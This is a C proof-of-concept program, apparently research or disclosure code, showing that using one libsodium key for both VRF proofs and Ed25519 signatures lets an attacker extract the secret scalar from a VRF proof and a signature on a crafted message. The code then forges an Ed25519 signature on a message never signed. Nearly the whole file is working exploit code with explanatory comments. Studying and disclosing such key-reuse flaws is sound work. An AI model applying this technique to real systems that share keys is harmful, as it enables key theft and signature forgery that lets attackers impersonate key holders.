#include <stdio.h>
#include <string.h>
#include <sodium.h>

int main() {
#define MESSAGE (const unsigned char *) "yup"
#define MESSAGE_LEN 3

    unsigned char crafted_msg[32], proof[80], sig[crypto_sign_BYTES], pk[crypto_sign_PUBLICKEYBYTES];

    // We create the scope of the signer, over which we have no access when faking
    // the signature.
    {
        unsigned char sk[crypto_sign_SECRETKEYBYTES];
        crypto_sign_keypair(pk, sk);

        // Now let's use these keys for vrf generation. The message that we need
        // to craft in order to extract the key is a value publicly available. However,
        // libsodium does not export the functions to compute it. Nonetheless, it is
        // computed internally. To simplify our lives, we slightly modify libsodium VRF
        // verifier to return the crafted message.
        crypto_vrf_ietfdraft03_prove(proof, sk, MESSAGE, MESSAGE_LEN);

        // Now, we have a proof that consists of 80 bytes that correspond to:
        // * 32 bytes of an EC point that we can ignore
        // * 16 bytes of a challenge C = H(pk, H, Gamma, U, V), where the values
        // of H, Gamma, U and V are irrelevant.
        // * 32 bytes of a scalar s' = k + C' * az
        // where k = H(z || m), with z equal to above, and az as well.

        unsigned char random_output[64];
        if (crypto_vrf_ietfdraft03_verify(random_output, crafted_msg, pk, proof, MESSAGE, MESSAGE_LEN))
            printf("failed VRF\n \n");

        // Now we use the same key to create an ed25519 signature for the crafted message. Note
        // that the only 'trick' we are doing is asking the signer to sign a particular message, after
        // she has used the key to create a VRF proof. We do not access the secret key in any other way.
        crypto_sign_detached(sig, NULL, crafted_msg, 32, sk);

        if (crypto_sign_verify_detached(sig, crafted_msg, 32, pk))
            printf("failed on ed25519 generation");

        // Now we should have a 64 bytes signature that corresponds to:
        // * first 32 bytes represent the point R = k * G, where k = H(z || m)
        // where z = H(sk)[32..]
        // * second 32 bytes represent a scalar s = k + az * HRAM
        // where HRAM = H(R || pk || m), and az = H(sk)[..32]
    }

    // What is the problem here? That the two challenges are different. What does this mean?
    // That we can extract the secret key. Mainly, we have that:
    // s - s' = (c - c') * az <=> az = (s - s') / (c - c')

    // Let's try to break it:

    unsigned char c[64], cprime[32];
    // First we need to compute c, as it is not given in the ed25519 signature. This is done
    // using public values.
    crypto_hash_sha512_state hs;

    crypto_hash_sha512_init(&hs);
    crypto_hash_sha512_update(&hs, sig, 32);
    crypto_hash_sha512_update(&hs, pk, 32);
    crypto_hash_sha512_update(&hs, crafted_msg, 32);
    crypto_hash_sha512_final(&hs, c);

    crypto_core_ed25519_scalar_reduce(c, c);

    // Now wes simply copy the challenge into a 16 byte string
    memcpy(cprime, proof + 32, 16);
    memset(cprime + 16, 0, 16); // Just for sanity.


    // Now we have all we need, let's extract the secret.
    unsigned char cminuscprimeinv[32], extracted_skey[32], extracted_pkey[32];
    crypto_core_ed25519_scalar_sub(extracted_skey, sig + 32, proof + 48);
    crypto_core_ed25519_scalar_sub(cminuscprimeinv, c, cprime);
    crypto_core_ed25519_scalar_invert(cminuscprimeinv, cminuscprimeinv);

    crypto_core_ed25519_scalar_mul(extracted_skey, extracted_skey, cminuscprimeinv);

    crypto_scalarmult_ed25519_base_noclamp(extracted_pkey, extracted_skey);


    // So now, let's create a fake ed25519 signature for message {0} [not signed before]
    // We cannot use the normal API because the algorithm uses the preimage of an extension
    // of the key we have extracted. However, the 'missing' data is not necessary to forge
    // a signature. Goes without saying that the adversary now can create invalid VRF proofs.
    unsigned char nonce_fake[32], challenge[64], sig_fake[64], reduced_c[32];
    crypto_hash_sha512_state hs_f;
    unsigned char msg[32] = {0};

    // commitment
    crypto_core_ed25519_scalar_random(nonce_fake);
    crypto_scalarmult_ed25519_base_noclamp(sig_fake, nonce_fake);

    // challenge
    crypto_hash_sha512_init(&hs_f);
    crypto_hash_sha512_update(&hs_f, sig_fake, 32);
    crypto_hash_sha512_update(&hs_f, extracted_pkey, 32);
    crypto_hash_sha512_update(&hs_f, msg, 32);
    crypto_hash_sha512_final(&hs_f, challenge);

    crypto_core_ed25519_scalar_reduce(reduced_c, challenge);

    // response
    crypto_core_ed25519_scalar_mul(sig_fake + 32, reduced_c, extracted_skey);
    crypto_core_ed25519_scalar_add(sig_fake + 32, sig_fake + 32, nonce_fake);

    if (crypto_sign_verify_detached(sig_fake, msg, 32, pk))
        printf("Failed to fake ed25519\n");
    else
        printf("Successfully faked an ed25519 sig\n");

    return 0;
}